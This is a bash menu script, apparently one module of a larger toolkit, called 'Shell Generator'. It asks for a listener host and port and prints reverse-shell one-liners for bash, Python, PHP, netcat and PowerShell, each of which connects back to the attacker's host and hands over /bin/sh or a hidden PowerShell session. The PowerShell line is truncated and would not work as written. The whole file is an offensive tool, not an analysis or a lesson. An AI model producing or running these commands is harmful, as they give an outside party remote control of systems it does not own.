# NAME: Shell Generator
while true; do
    clear
    echo -e "${GRAY}┌─ Shell Generator ───────────────────┐${NC}"
    echo -e "${GRAY}│${NC} ${WHITE}[1]${NC} ${GRAY}Bash Reverse${NC}"
    echo -e "${GRAY}│${NC} ${WHITE}[2]${NC} ${GRAY}Python Reverse${NC}"
    echo -e "${GRAY}│${NC} ${WHITE}[3]${NC} ${GRAY}PHP Reverse${NC}"
    echo -e "${GRAY}│${NC} ${WHITE}[4]${NC} ${GRAY}Netcat Reverse${NC}"
    echo -e "${GRAY}│${NC} ${WHITE}[5]${NC} ${GRAY}PowerShell${NC}"
    echo -e "${GRAY}│${NC} ${WHITE}[0]${NC} ${GRAY}Back${NC}"
    echo -e "${GRAY}└─────────────────────────────────────┘${NC}"
    read -p "  $(t choose): " c
    [ "$c" = "0" ] && return
    read -p "  LHOST: " lh
    read -p "  LPORT [4444]: " lp; lp=${lp:-4444}
    clear
    case "$c" in
        1) echo "  bash -i >& /dev/tcp/$lh/$lp 0>&1" ;;
        2) echo "  python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$lh\",$lp));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'" ;;
        3) echo "  php -r '\$sock=fsockopen(\"$lh\",$lp);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" ;;
        4) echo "  nc -e /bin/sh $lh $lp" ;;
        5) echo "  powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$lh\",$lp)" ;;
    esac
    read -p "  $(t press_any)..." ;;
done
